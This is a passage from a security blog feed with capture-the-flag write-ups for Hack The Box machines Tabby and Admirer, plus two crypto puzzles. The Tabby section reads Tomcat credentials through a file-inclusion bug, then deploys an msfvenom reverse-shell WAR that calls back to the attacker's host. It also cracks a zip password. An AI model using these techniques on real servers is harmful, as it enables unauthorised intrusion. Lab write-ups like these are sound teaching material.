Host is up (0.30s latency).
Not shown: 996 closed ports

PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http     Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open     http     Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.59 seconds</code></pre><h3 id="port-80">Port 80</h3><img src="https://inesmartins.github.io//content/images/2020/07/Hack-The-Box----Tabby-2020-07-09-21-15-07.png" alt="HTB Write-up | Tabby"><p>The Apache server running on port <code>80</code> seems to be the website for a hosting company called &quot;Mega Hosting&quot;:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/Mega-Hosting-2020-07-01-19-43-52-3.png" class="kg-image" alt="HTB Write-up | Tabby" loading="lazy"></figure><p>The home page has a link for their &quot;statement on recovering from the data breach&quot;. When we click the link we&apos;re redirected to <a href="http://megahosting.htb/news.php?file=statement">http://megahosting.htb/news.php?file=statement</a>. If we access the page on the <code>tabby.htb</code> domain (which we had previously configured on <code>/etc/hosts</code>) we see the following message:</p><pre><code>We apologise to all our customers for the previous data breach.

We have changed the site to remove this tool, and have invested heavily in more secure servers</code></pre><p>So, from this statement we understand that a <em>tool </em>was removed from the site, which will probably be of use in the future.</p><p>Also very interesting is the way that the <code>statement</code> file is being fetched, let&apos;s see if we can fetch any file we want:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/VULNS.png" class="kg-image" alt="HTB Write-up | Tabby" loading="lazy"></figure><p>Bingo! </p><h3 id="port-8080">Port 8080</h3><p>When we access port <code>8080</code> we see the &quot;default Tomcat home page&quot;.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/07/Apache-Tomcat-2020-07-01-19-45-46.png" class="kg-image" alt="HTB Write-up | Tabby" loading="lazy"></figure><p>Since we&apos;ve already identified a <a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability">Local File Inclusion vulnerability</a> on port <code>80</code>, the next logic step would be to try and access the credentials file on the server, however, this file was not in the typical location, in fact, it took me a couple of hours to find it hosted at <code>usr/share/tomcat9/etc/tomcat-users.xml</code>.</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
...
&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot;
   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
   xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;
   version=&quot;1.0&quot;&gt;
 ...
   &lt;role rolename=&quot;admin-gui&quot;/&gt;
   &lt;role rolename=&quot;manager-script&quot;/&gt;
   &lt;user username=&quot;tomcat&quot; password=&quot;$3cureP4s5w0rd123!&quot; roles=&quot;admin-gui,manager-script&quot;/&gt;
&lt;/tomcat-users&gt;</code></pre><hr><h2 id="getting-user">Getting User</h2><p>As we can see above, <code>tomcat</code> has the following roles:</p><ul><li><code>admin-gui</code>: allows the user to access the host-manager&apos;s <a href="http://tabby.htb:8080/host-manager/html">graphical interface</a>;</li><li><code>manager-script</code>: allows the user to access the manager&apos;s <a href="http://tabby.htb:8080/manager/text/">text interface</a> and <a href="http://tabby.htb:8080/manager/status/all">server status</a>.</li></ul><p>The text interface is basically a <a href="https://tomcat.apache.org/tomcat-9.0-doc/host-manager-howto.html">REST API</a> that is able to execute some commands. Let&apos;s try to list all the applications running on this server:</p><pre><code>~ curl -u &quot;tomcat&quot; http://tabby.htb:8080/manager/text/list
Enter host password for user &apos;tomcat&apos;: $3cureP4s5w0rd123!

OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:2:/usr/share/tomcat9-examples/examples
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/shell:running:3:shell
/my-shell2:running:10:my-shell2
/siren.war:running:0:siren.war
/my-shell4:running:1:my-shell4
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
/my-shell:running:1:my-shell
/my-shell1:running:2:my-shell1</code></pre><p>OK, as we can see a couple of other HTB users have clearly abused this feature, let&apos;s try to upload our own reverse shell using this interface:</p><pre><code>~ curl -T &quot;./php-reverse-shell.php&quot; &quot;http://tabby.htb:8080/manager/text/deploy?path=/shelly&amp;update=true&quot; -u tomcat
Enter host password for user &apos;tomcat&apos;: $3cureP4s5w0rd123!

FAIL - Deployed application at context path [/shelly] but context failed to start</code></pre><p>Turns out the shell was uploaded but since it&apos;s not a <code>.war</code> it&apos;s not run by the server. After searching how to embed a reverse shell in a <code>.war</code> file I came across <a href="https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/">this</a> article that provided a bunch of different methods. This was the most effective:</p><pre><code>~ msfvenom -p java/jsp_shell_reverse_tcp LHOST=OUR_IP LPORT=4444 -f war &gt; shelly.war

~ curl -T &quot;./shelly.war&quot; &quot;http://tabby.htb:8080/manager/text/deploy?path=/shelly&amp;update=true&quot; -u tomcat
Enter host password for user &apos;tomcat&apos;: $3cureP4s5w0rd123!
OK - Deployed application at context path [/shelly]</code></pre><p>Now when we access <code>http://tabby.htb:8080/shelly/</code> we get a reverse shell. <br>Let&apos;s upgrade it!</p><pre><code>~ /usr/bin/python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><p>I tried authenticating with <code>su</code> as the user <code>ash</code> with the password we already know and also with &#xA0;<code>clive</code>, which we found on the <code>/etc/passwd</code> file, but both failed.</p><h3 id="becoming-ash">Becoming ash</h3><p>I started by looking for files belonging to <code>ash</code>, which led me to an interesting zip file:</p><pre><code>tomcat@tabby:/var$ find ./ -user ash
...
./www/html/files
./www/html/files/16162020_backup.zip</code></pre><p>The file was password protected and neither <code>clive</code> nor <code>$3cureP4s5w0rd123!</code> worked. In order to brute-force the answer I first <a href="https://inesmartins.github.io//how-to-dowload-files-from-reverse-shells-on-macos/">downloaded the file</a> to my machine and then used a zip file cracker - <code>fcrackzip</code> :</p><pre><code>kali@kali:~/$ fcrackzip -D -p rockyou.txt tabby.zip -u
PASSWORD FOUND!!!!: pw == admin@it

kali@kali:~/$ unzip tabby.zip 
Archive:  tabby.zip
[tabby.zip] var/www/html/favicon.ico password: 
  inflating: var/www/html/favicon.ico  
  inflating: var/www/html/index.php  
 extracting: var/www/html/logo.png   
  inflating: var/www/html/news.php   
  inflating: var/www/html/Readme.txt
</code></pre><p>Turns out there&apos;s nothing useful on this extracted folder, but the password can be use to login as <code>ash</code>:</p><pre><code>tomcat@tabby:/var/www/html$ su - ash
su - ash
Password: admin@it

ash@tabby:~$ cat user.txt</code></pre><p>Finally, I SSHed into the machine after adding the public key to <code>/home/ash/.ssh/authorized_key</code>:</p><pre><code>ssh -i ash@tabby.htb</code></pre><hr><h2 id="getting-root">Getting root</h2><pre><code>ash@tabby:~$ ls
alpine-v3.12-x86_64-20200710_0223.tar.gz  snap  user.txt</code></pre><p>Seeing the <code>alpine</code> zip file I realised the privilege escalation was probably be related to <code>lxd</code>. </p><p>I <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">followed</a> this article and got the root flag.</p><hr>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC | Underground Leaks (Crypto)]]></title><description><![CDATA[Write-up for retired Oposec's October challenge]]></description><link>https://inesmartins.github.io//oposec-underground-leaks/</link><guid isPermaLink="false">5f89dd96b225522b040c4394</guid><category><![CDATA[crypto]]></category><category><![CDATA[java]]></category><category><![CDATA[ctf]]></category><category><![CDATA[oposec]]></category><category><![CDATA[random]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Tue, 27 Oct 2020 22:02:35 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/10/highres_471963990-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<pre><code>Rui Tinto admitted having some information about the snitch from the 0XOPOLEAKS. However, he&apos;s unwilling to give the passwords unless his demands of having Kripthor on 0xOPOSEC get fulfilled. 
Meanwhile, government forces tried to crack the passwords with no success. 
We know from underground sources that Rui Tinto does cipher each file individually for higher security and privacy. 
We manage to put our hands on his top-notch closed source software used for encrypting the information.
Leak: https://sefod.eu/oposec/underground_leaks.tar.gz</code></pre><img src="https://inesmartins.github.io//content/images/2020/10/highres_471963990-1-1.jpeg" alt="&#xD8;xOPOS&#x246;C | Underground Leaks (Crypto)"><p>The tar contains a java executable and 3 files that look like ciphertexts:</p><pre><code>~ ls -la ./
...
-rw-r--r--   1 inesmartins  staff    32 Oct 16 11:09 1
-rw-r--r--   1 inesmartins  staff    32 Oct 16 11:09 2
-rw-r--r--   1 inesmartins  staff    32 Oct 16 11:09 3
-rw-r--r--   1 inesmartins  staff  3992 Oct 16 10:38 HelloWorldApp.class</code></pre><pre><code>~ xxd 1
00000000: ad42 207a 20db eb81 b536 25a0 865e 6778  .B z ....6%..^gx
00000010: f23d 2a26 8e76 9970 6cfd 0673 2051 002b  .=*&amp;.v.pl..s Q.+

~ xxd 2
00000000: 2dcd cdcd a751 4e47 fd46 e8e0 8334 eade  -....QNG.F...4..
00000010: 1796 e6e4 b25f 6f8d 5d47 f2b6 f688 38f7  ....._o.]G....8.

~ xxd 3
00000000: dada da4d 43e1 9595 3914 ca23 d84a df52  ...MC...9..#.J.R
00000010: d897 0b06 89e7 773e 7f31 7dca 4a52 e2b7  ......w&gt;.1}.JR..</code></pre><p>It seems like this application encrypts a secret in a file that we provide:</p><pre><code>~ touch plaintext.txt
~ java HelloWorldApp encode plaintext.txt
Hey kid, do you have any leaks?
tell me:
this is my very secret secret
Keep this key: E5F1F22FE01B9E10D17E3825ACE23799</code></pre><p>Once we have they key, we&apos;re then able to get the secret back using the same application:</p><pre><code>~ java HelloWorldApp decode plaintext.txt
Please provide a key:
E5F1F22FE01B9E10D17E3825ACE23799
this is my very secret secret</code></pre><hr><h2 id="analysing-the-application">Analysing the application</h2><p>I started by decompiling the file using <a href="https://marketplace.visualstudio.com/publishers/tintinweb">tintinweb</a>:</p><pre><code class="language-java">import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

class HelloWorldApp {
  static String encryption_mode = &quot;AES/CBC/PKCS5Padding&quot;;
  
  public static void main(String[] paramArrayOfString) {
    if (paramArrayOfString.length == 2) {
      if (paramArrayOfString[0].equals(&quot;decode&quot;)) {
        decode(paramArrayOfString[1]);
      } else if (paramArrayOfString[0].equals(&quot;encode&quot;)) {
        encode(paramArrayOfString[1]);
      } else {
        System.out.print(&quot;encode|decode file_input|file_output&quot;);
        System.exit(0);
      } 
    } else {
      System.out.print(&quot;encode|decode file_input|file_output&quot;);
      System.exit(0);
    } 
  }
  
  public static void encode(String paramString) {
    Random random = new Random(5040508L);
    int i = (new Random()).nextInt(1000000);
    for (b = 0; b &lt; i; b++)
      random.nextInt(256); 
    try {
      String str1 = &quot;read text from input&quot;;
      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(System.in));
      System.out.print(&quot;Hey kid, do you have any leaks?\ntell me:\n&quot;);
      String str2 = bufferedReader.readLine();
      str1 = &quot;creating iv key&quot;;
      byte[] arrayOfByte1 = new byte[16];
      for (byte b1 = 0; b1 &lt; 16; b1++) {
        int j = random.nextInt(256);
        arrayOfByte1[b1] = (byte)j;
      } 
      str1 = &quot;creating key&quot;;
      byte[] arrayOfByte2 = new byte[16];
      for (byte b2 = 0; b2 &lt; 16; b2++) {
        int j = random.nextInt(256);
        arrayOfByte2[b2] = (byte)j;
      } 
      str1 = &quot;encrypting content&quot;;
      byte[] arrayOfByte3 = encrypt(str2, arrayOfByte2, arrayOfByte1);
      str1 = &quot;write content to file&quot;;
      FileOutputStream fileOutputStream = new FileOutputStream(paramString);
      fileOutputStream.write(arrayOfByte1);
      fileOutputStream.write(arrayOfByte3);
      fileOutputStream.close();
      System.out.print(&quot;Keep this key: &quot;);
      System.out.print(bytesToHex(arrayOfByte2));
    } catch (Exception b) {
      Exception exception;
      exception.printStackTrace();
    } 
  }
  
  public static void decode(String paramString) {
    String str = &quot;read file, split iv and encrypted content and decode with the input key&quot;;
    try {
      File file = new File(paramString);
      FileInputStream fileInputStream = new FileInputStream(file);
      byte[] arrayOfByte1 = fileInputStream.readAllBytes();
      byte[] arrayOfByte2 = new byte[16];
      for (byte b = 0; b &lt; arrayOfByte2.length; b++)
        arrayOfByte2[b] = arrayOfByte1[b]; 
      System.out.print(&quot;Please provide a key:\n&quot;);
      BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(System.in));
      String str1 = bufferedReader.readLine();
      byte[] arrayOfByte3 = hexStringToByteArray(str1);
      byte[] arrayOfByte4 = new byte[arrayOfByte1.length - arrayOfByte2.length];
      for (int i = arrayOfByte2.length; i &lt; arrayOfByte1.length; i++)
        arrayOfByte4[i - arrayOfByte2.length] = arrayOfByte1[i]; 
      String str2 = decrypt(arrayOfByte4, arrayOfByte3, arrayOfByte2);
      System.out.print(str2);
      System.out.print(&quot;\n&quot;);
    } catch (Exception exception) {
      exception.printStackTrace();
    } 
  }
  
  public static void noNeedToLookBelowThis() {}
  
  private static final char[] HEX_ARRAY = &quot;0123456789ABCDEF&quot;.toCharArray();
  
  public static String bytesToHex(byte[] paramArrayOfByte) {
    char[] arrayOfChar = new char[paramArrayOfByte.length * 2];
    for (byte b = 0; b &lt; paramArrayOfByte.length; b++) {
      byte b1 = paramArrayOfByte[b] &amp; 0xFF;
      arrayOfChar[b * 2] = HEX_ARRAY[b1 &gt;&gt;&gt; 4];
      arrayOfChar[b * 2 + 1] = HEX_ARRAY[b1 &amp; 0xF];
    } 
    return new String(arrayOfChar);
  }
  
  public static byte[] hexStringToByteArray(String paramString) {
    int i = paramString.length();
    byte[] arrayOfByte = new byte[i / 2];
    for (byte b = 0; b &lt; i; b += 2)
      arrayOfByte[b / 2] = 
        (byte)((Character.digit(paramString.charAt(b), 16) &lt;&lt; 4) + Character.digit(paramString.charAt(b + 1), 16)); 
    return arrayOfByte;
  }
  
  public static byte[] encrypt(String paramString, byte[] paramArrayOfByte1, byte[] paramArrayOfByte2) throws Exception {
    Cipher cipher = Cipher.getInstance(encryption_mode);
    SecretKeySpec secretKeySpec = new SecretKeySpec(paramArrayOfByte1, &quot;AES&quot;);
    cipher.init(1, secretKeySpec, new IvParameterSpec(paramArrayOfByte2));
    return cipher.doFinal(paramString.getBytes());
  }
  
  public static String decrypt(byte[] paramArrayOfByte1, byte[] paramArrayOfByte2, byte[] paramArrayOfByte3) throws Exception {
    Cipher cipher = Cipher.getInstance(encryption_mode);
    SecretKeySpec secretKeySpec = new SecretKeySpec(paramArrayOfByte2, &quot;AES&quot;);
    cipher.init(2, secretKeySpec, new IvParameterSpec(paramArrayOfByte3));
    return new String(cipher.doFinal(paramArrayOfByte1));
  }
}
</code></pre><p>The first thing that stood out was the <code>AES/CBC/PKCS5Padding</code> encryption mode, which is vulnerable to &#xA0;<a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Padding oracle attacks</a>. However, after trying and failing to follow this route, I took a closer look at to the logic behind the random number generation:</p><pre><code class="language-java">public static void encode(String paramString) {
    ...
    Random random = new Random(5040508L);
    int i = (new Random()).nextInt(1000000);
    for (int b = 0; b &lt; i; b++) {
    	random.nextInt(256);
    }
    ...
    try {
    
    	byte[] iv = new byte[16];
    	for (byte b1 = 0; b1 &lt; 16; b1++) {
            int j = random.nextInt(256);
            iv[b1] = (byte)j;
    	}
        
        byte[] aeskey = new byte[16];
    	for (byte b2 = 0; b2 &lt; 16; b2++) {
            int j = random.nextInt(256);
            aeskey[b2] = (byte)j;
    	}
        ...
    }
}</code></pre><p>It seems like:</p><ul><li>the random numbers are being generated using a <a href="https://docs.oracle.com/javase/8/docs/api/java/util/Random.html">Random</a> object (a Java pseudo-number generator), which is being initialised with a fixed seed: <code>5040508L</code>;</li><li>the AES key is being generated right after the IV.</li></ul><p>So, it&apos;s just a matter of brute-forcing the solution:</p><pre><code class="language-java">import java.util.Random;

public class RandomBreaker {
    
    public static String iv = &quot;bbbbbbded5a15b60b0d7fdfe922e53a5&quot;;
    
    public static void main(String[] args) {
        byte[] ivData = hexStringToByteArray(iv);
        Random random = new Random(5040508L);
        for (int i = 0; i &lt; 1000000; i++) {
            if (matchesNext16(random, ivData)) {
                String keyHex = byteArrayToHexString(getNext16Bytes(random));
                System.out.println(keyHex);
                return;
            }
        }
    }
    
    private static boolean matchesNext16(Random random, byte[] bytes) {
        for (int i = 0; i &lt; bytes.length; i++) {
            byte nextByte = (byte)random.nextInt(256);
            if (nextByte != bytes[i]) {
                return false;
            }
        }
        return true;
    }
    
    private static byte[] getNext16Bytes(Random random) {
        byte[] bytes = new byte[16];
        for (int i = 0; i &lt; 16; i++) {
            bytes[i] = (byte)random.nextInt(256);
        }
        return bytes;
    }
    
    private static String byteArrayToHexString(byte[] a) {
        StringBuilder sb = new StringBuilder(a.length * 2);
        for(byte b: a)
            sb.append(String.format(&quot;%02x&quot;, b));
        return sb.toString();
    }
    
    private static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i &lt; len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) &lt;&lt; 4) + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }
    
}</code></pre><p>After repeating this process for all the 3 files, we get the flag: <code>flag{The_truth_is_out_there}</code>.</p><p>You can find the repository with the original challenge and the other solutions <a href="https://github.com/zezadas/0xOPOSEC_0x0D_PSEUDO_RANDOM">here</a>.</p>]]></content:encoded></item><item><title><![CDATA[HTB Crypto Challenge | Bank Heist]]></title><description><![CDATA[Write-up for retired HTB crypto challenge that involves Multi-tap code and Atbash Cipher.]]></description><link>https://inesmartins.github.io//htb-crypto-challenge/</link><guid isPermaLink="false">5eeba38b1e7da103a083dba9</guid><category><![CDATA[crypto]]></category><category><![CDATA[htb]]></category><category><![CDATA[multitap phone cipher]]></category><category><![CDATA[challenge]]></category><category><![CDATA[ctf]]></category><category><![CDATA[phone keypad]]></category><category><![CDATA[atbash]]></category><category><![CDATA[cryptography]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 09:09:15 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/10/heist-movies-on-netflix-866x487.jpg" medium="image"/><content:encoded><![CDATA[<blockquote><em>Hint: You get to the scene of a bank heist and find that you have caught one person. Under further analysis of the persons flip phone you see a message that seems suspicious. Can you figure out what the message to put this guy in jail?</em></blockquote><pre><code>444333 99966688 277733 7773323444664 84433 22244474433777, 99966688 277733 666552999. 99966688777 777744277733 666333 84433 443344477778 4447777 44466 99966688777 4466688777733. 84433 5533999 8666 84433 55566622255 4447777 22335556669. 4666 8666 727774447777.

47777888 995559888 4555 47777888 44999988 666555997 : 8555444888477744488866888648833369!!</code></pre><img src="https://inesmartins.github.io//content/images/2020/10/heist-movies-on-netflix-866x487.jpg" alt="HTB Crypto Challenge | Bank Heist"><p>The number repetition is a dead giveaway for the <a href="https://en.wikipedia.org/wiki/Multi-tap">Multi-tap Cipher</a>, i.e.: the text you get when you use an older phone to create text messages. Luckily, there&apos;s <a href="https://www.dcode.fr/multitap-abc-cipher">an online tool</a> that automatically decodes this:</p><pre><code>IF YOU ARE READING THE CIPHER, YOU ARE OKAY.
YOUR SHARE OF THE HEIST IS IN YOUR HOUSE.
THE KEY TO THE LOCK IS BELOW.
GO TO PARIS.
GSV XLWV GL GSV HZU OLXP : TLIVGRIVNVMGUFMW!!</code></pre><p>So, it seems there&apos;s an additional cipher to crack:</p><pre><code>GSV XLWV GL GSV HZU OLXP : TLIVGRIVNVMGUFMW!!</code></pre><p><a href="https://scwf.dima.ninja/">Solve Crypto with Force!</a><em><strong> </strong></em>is an awesome website that immediately identified the cipher - <a href="https://en.wikipedia.org/wiki/Atbash">Atbash</a>:</p><pre><code>THE CODE TO THE SAF LOCK : GORETIREMENTFUND!!</code></pre><p>So, there&apos;s the flag: <code>HTB{GORETIREMENTFUND!!}</code>.</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Admirer]]></title><description><![CDATA[Write-up for Adminer, a retired HTB machine.]]></description><link>https://inesmartins.github.io//htb-write-up-admirer/</link><guid isPermaLink="false">5ede4cc8b6ef324dc7275dc8</guid><category><![CDATA[htb]]></category><category><![CDATA[ftp]]></category><category><![CDATA[adminer]]></category><category><![CDATA[mysql]]></category><category><![CDATA[privesc]]></category><category><![CDATA[python]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Thu, 22 Oct 2020 09:07:19 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2020/10/admirer.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io//content/images/2020/10/admirer.png" alt="HTB Write-up | Admirer"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/248">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>As always, we start with some basic scanning, with tells us that the machine has:</p><ul><li>an <code>FTP</code> service (vsftp) running on port 21;</li><li>an <code>OpenSSH</code> service running on port 22;</li><li>an <code>Apache</code> web server running on port 80:</li></ul><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A admirer.htb

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 15:37 WEST
Nmap scan report for admirer.htb (10.10.10.187)
Host is up (0.043s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre>
<!--kg-card-end: markdown--><p>The web application is just a very simple image gallery, there&apos;s no authentication or anything that immediately stands out, so we start by exploring the disallowed entry (<code>/admin-dir</code>) found during the scan.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/main.png" class="kg-image" alt="HTB Write-up | Admirer" loading="lazy"></figure><p>We can&apos;t directly access the admin-dir directory but the <a href="http://admirer.htb/robots.txt">robots.txt</a> file has a little clue left to us by &quot;waldo&quot;:</p><!--kg-card-begin: markdown--><pre><code>User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
</code></pre>
<!--kg-card-end: markdown--><p>With this small clue, we find 2 files:</p><ul><li><a href="http://admirer.htb/admin-dir/credentials.txt">http://admirer.htb/admin-dir/credentials.txt</a></li></ul><!--kg-card-begin: markdown--><pre><code>[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
</code></pre>
<!--kg-card-end: markdown--><ul><li><a href="http://admirer.htb/admin-dir/contacts.txt">http://admirer.htb/admin-dir/contacts.txt</a>:</li></ul><!--kg-card-begin: markdown--><pre><code>##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb

##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb
# Amy
Email: a.bialik@admirer.htb
# Leonard
Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb
# Bernadette
Email: b.rauch@admirer.htb
</code></pre>
<!--kg-card-end: markdown--><p>Let&apos;s do a quick roundup of what we have so far:</p><ol><li>A list of users (with first name and email) that all seem to match the names of Big Bang Theory&apos;s characters (except Sheldon Cooper who is instead Waldo Cooper);</li><li>Credentials to one email account (w.cooper@admirer.htb);</li><li>Credentials to one FTP account (ftpuser);</li><li>Credentials to one Wordpress account (admin).</li></ol><p>Since we don&apos;t yet know of a way to access the email server or the Wordpress account, we try to explore the FTP service:</p><!--kg-card-begin: markdown--><pre><code>$ ftp 10.10.10.187

Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp&gt; pass
Passive mode on.

ftp&gt; ls
227 Entering Passive Mode (10,10,10,187,175,74)
150 Here comes the directory listing.
-rw-r--r-- 1 0 0 3405 Dec 02 21:24 dump.sql
-rw-r--r-- 1 0 0 5270987 Dec 03 21:20 html.tar.gz
226 Directory send OK.

</code></pre>
<!--kg-card-end: markdown--><ol><li>The <code>dump.sql</code> file contains a dump of a MariaDB database called <strong>admirerdb</strong>. This DB contains only one table - Items - which includes the images and respective metadata that appear on the site, so nothing too exciting;</li><li>The <code>html.tar.gz</code> includes a bunch of files that look like a backup of the current web application. Here are some of the most noteworthy:</li></ol><h3 id="robots-txt">robots.txt</h3><p>The backup version of the robots.txt file disallows <code>/w4ld0s_s3cr3t_d1r</code> instead of <code>/admin-dir</code>.</p><!--kg-card-begin: markdown--><pre><code>User-agent: *
This folder contains personal stuff, so no one (not even robots!) should see it - waldo
Disallow: /w4ld0s_s3cr3t_d1r
</code></pre>
<!--kg-card-end: markdown--><h3 id="index-php">index.php</h3><p>Contains the code for the main page of the web application, including some credentials for the admirerdb.</p><!--kg-card-begin: markdown--><pre><code>...
&lt;div id=&quot;main&quot;&gt;
&lt;?php
    $servername = &quot;localhost&quot;;
    $username = &quot;waldo&quot;;
    $password = &quot;]F7jLHw:*G&gt;UPrTo}~A&quot;d6b&quot;;
    $dbname = &quot;admirerdb&quot;;

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);
    
    // Check connection
    if ($conn-&gt;connect_error) {
        die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
    }

    $sql = &quot;SELECT * FROM items&quot;;
    $result = $conn-&gt;query($sql);

    if ($result-&gt;num_rows &gt; 0) {
        // output data of each row
        while($row = $result-&gt;fetch_assoc()) {
            echo &quot;&lt;article class=&apos;thumb&apos;&gt;&quot;;
            echo &quot;&lt;a href=&apos;&quot;.$row[&quot;image_path&quot;].&quot;&apos; class=&apos;image&apos;&gt;&lt;img src=&apos;&quot;.$row[&quot;thumb_path&quot;].&quot;&apos; alt=&apos;&apos; /&gt;&lt;/a&gt;&quot;;
            echo &quot;&lt;h2&gt;&quot;.$row[&quot;title&quot;].&quot;&lt;/h2&gt;&quot;;
	    	echo &quot;&lt;p&gt;&quot;.$row[&quot;text&quot;].&quot;&lt;/p&gt;&quot;;
	    	echo &quot;&lt;/article&gt;&quot;;
        }
    } else {
        echo &quot;0 results&quot;;
    }
    $conn-&gt;close();
?&gt;
&lt;/div&gt;
...
</code></pre>
<!--kg-card-end: markdown--><h3 id="w4ld0s_s3cr3t_d1r-credentials-txt">w4ld0s_s3cr3t_d1r/credentials.txt</h3><p>There&apos;s a credentials.txt file which contains the same credentials as found on <a href="http://admirer.htb/admin-dir/credentials.txt">http://admirer.htb/admin-dir/credentials.txt</a> and one additional cred:</p><!--kg-card-begin: markdown--><pre><code>[Bank Account]
waldo.11
Ezy]m27}OREc$
</code></pre>
<!--kg-card-end: markdown--><h3 id="utility_scripts-db_admin-php">utility_scripts/db_admin.php</h3><p>There&apos;s a small script that handles the connection with the database, which contains some credentials:</p><!--kg-card-begin: markdown--><pre><code>&lt;?php
    $servername = &quot;localhost&quot;;
    $username = &quot;waldo&quot;;
    $password = &quot;Wh3r3_1s_w4ld0?&quot;;
    
    // Create connection
    $conn = new mysqli($servername, $username, $password);
    
    // Check connection
    if ($conn-&gt;connect_error) {
        die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
    }
    echo &quot;Connected successfully&quot;;
    
    // TODO: Finish implementing this or find a better open source alternative
?&gt;

</code></pre>
<!--kg-card-end: markdown--><p>So, now we have 2 new credentials:</p><ul><li>one for a bank account (waldo.11);</li><li>one for a mySQL database (waldo);</li></ul><p>Going back to the deployed version of the web application, the <a href="http://admirer.htb/w4ld0s_s3cr3t_d1r/contacts.txt">w4ld0s_s3cr3t_d1r</a> doesn&apos;t seem to be available anymore, but the <a href="http://10.10.10.187/utility-scripts/">utility_scripts</a> dir does exist.</p><p>Of all the files on the backup, the <a href="http://10.10.10.187/utility-scripts/admin_tasks.php">admin-tasks page</a> is the most interesting. This page allows any user to check very simple info about the system:</p><figure class="kg-card kg-image-card kg-width-full"><img src="https://inesmartins.github.io//content/images/2020/06/4.png" class="kg-image" alt="HTB Write-up | Admirer" loading="lazy"></figure><p>At this point I was a bit stuck but after reviewing all the previous clues I realised I missed something on the db_admin.php file:</p><pre><code>// TODO: Finish implementing this or find a better open source alternative
